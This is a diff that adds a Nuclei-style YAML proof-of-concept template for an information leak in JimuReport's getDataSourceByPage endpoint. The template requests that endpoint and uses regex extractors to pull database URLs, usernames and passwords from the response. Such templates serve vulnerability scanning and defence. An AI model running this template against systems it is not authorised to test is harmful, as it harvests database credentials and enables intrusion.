@@ -1,0 +1,32 @@
+id: poc-yaml-jimureport-getdatasourcebypage-info-leak
+info:
+  name: JimuReport getDataSourceByPage Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jmreport/getDataSourceByPage"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "\"dbUrl\":\"(.*?)\""
+          - "\"dbUsername\":\"(.*?)\""
+          - "\"dbPassword\":\"(.*?)\""
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"dbUrl\":\"(.*?)\""
+          - "\"dbUsername\":\"(.*?)\""
+          - "\"dbPassword\":\"(.*?)\""
